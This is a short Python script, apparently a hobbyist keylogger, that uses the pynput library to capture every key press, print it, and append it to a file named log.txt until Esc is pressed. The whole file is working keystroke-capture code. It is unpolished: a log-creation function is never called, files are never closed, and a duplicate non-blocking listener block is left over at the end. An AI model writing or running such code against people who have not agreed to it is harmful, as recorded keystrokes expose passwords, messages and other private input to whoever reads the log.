from pynput import keyboard

def CreateLog():
    f = open("log.txt", "w")





def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        f = open("log.txt", "a")
        f.write(key.char+"-")
        if key == keyboard.Key.esc:
         # Stop listener
         return False
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        f = open("log.txt", "a")
        f.write(str(key)+"-")
        if key == keyboard.Key.esc:
         # Stop listener
          return False
# Collect events until released
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press)
listener.start()